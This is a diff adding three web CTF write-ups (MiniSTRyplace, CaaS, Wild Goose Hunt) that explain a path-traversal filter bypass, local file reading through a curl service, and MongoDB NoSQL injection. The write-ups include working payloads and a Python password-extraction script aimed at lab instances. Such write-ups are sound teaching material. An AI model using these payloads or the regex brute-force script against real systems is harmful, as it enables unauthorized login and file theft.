@@ -102,3 +102,122 @@ The first part of the script overwrites ```index.html``` with the contents of th
 CHTB{p0llute_with_styl3}
 ```
 
+## MiniSTRyplace<a name="miniSTRyplace"></a>
+```
+Let's read this website in the language of Aliens. Or maybe not?
+```
+The challenge came with the source code, ```web_ministryplace.zip```
+### Solution
+On starting the docker container, we get ourselves a web page where you can choose the language. On checking out the source code file, index.php, we find something interesting:
+```php
+<html>
+    <header>
+        <meta name='author' content='bertolis, makelaris'>
+        <title>Ministry of Defence</title>
+        <link rel="stylesheet" href="/static/css/main.css">
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
+    </header>
+
+    <body>
+    <div class="language">
+        <a href="?lang=en.php">EN</a>
+        <a href="?lang=qw.php">QW</a>
+    </div>
+
+    <?php
+    $lang = ['en.php', 'qw.php'];
+        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
+    ?>
+    </body>
+</html>
+```
+More importantly, the part 
+```php  
+        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : 
+```
+It basically gives us the file that maches the name set by ```lang```. We only have to specify the name of the flag file in ```lang```. 
+But note that php replaces any string matching ```../``` with an empty string. 
+So to get the contents of the file ```../../flag```, we'll have to set lang as ```....//....//flag```.
+Sending a GET request with ```lang=....//....//flag```, we get the flag.
+
+The flag is:
+```
+MiniSTRyPlace: CHTB{b4d_4li3n_pr0gr4m1ng}
+```
+
+## CaaS<a name="caas"></a>
+```
+cURL As A Service, or CAAS is a brand new Alien Application, built so that humans can test the status of their websites. However, it seems that the aliens have not quite got the hang of Human Programming and the application is riddled with issues.
+```
+The challenge came with the source code, ```web_caas.zip```
+### Solution
+On starting the docker, we get ourselves a web page where we enter a url, and the server returns the output of the curl command run for that url. There is also a check to see if the input is a valid url, but it is done on the client side, and can easily be bypassed.
+
+On checking the source code, we have:
+```php
+    public function __construct($url)
+    {
+        $this->command = "curl -sL " . escapeshellcmd($url);
+    }
+
+    public function exec()
+    {
+        exec($this->command, $output);
+        return $output;
+    }
+```
+The escapeshellcmd() function escapes any possible characters that can be used to run shell commands. There are some bypasses for it, but it won't be necessary for this challenge. 
+We can simply get the flag by passing ```file:///../../flag``` as input.
+cURLing on the server's own fileserver gets us the flag.
+
+The flag is:
+```
+CHTB{f1le_r3trieval_4s_a_s3rv1ce}
+```
+
+## Wild Goose Hunt<a name="wildGooseHunt"></a>
+```
+Outdated Aliwn technology has been found by the human resistance. The system may contain sensitive information thet could be of use to us. Our experts are trying to find a way into the system. Can you help?
+```
+The challenge came with the source code, ```web_wild_goose_hunt.zip```
+### Solution
+On starting the docker, and browsing it, we are asked for username and password.
+The source code tells us that MongoDB is used. So NoSQL injection looks like a good start.
+
+Intercepting the login response, we see that it looks like this:
+```username=user&password=pass```
+Trying a simple payload:
+```json
+{"username": {"$gt": ""}, "password": {"$gt": ""} }
+```
+This returns the message: ```{"logged":1,"message":"Login Successful, welcome back admin."}```
+Now we know there's a user called admin.
+
+We'll now have to guess the password. Writing a python script to do that:
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+u="http://138.68.185.219:30775/api/login"
+headers={'content-type': 'application/json'}
+
+while True:
+    for c in string.printable:
+        if c.isalnum() or c == '_' or c == '}':
+            payload='{"username": {"$eq":"'+username+'"}, "password": {"$regex": "^'+password+c+'" }}'
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if '1' in r.text or r.status_code == 302:
+                print("Found one more char : %s" % (password+c))
+                password += c
+```
+([Reference](https://book.hacktricks.xyz/pentesting-web/nosql-injection))
+The flag is:
+```
+CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
+```
+
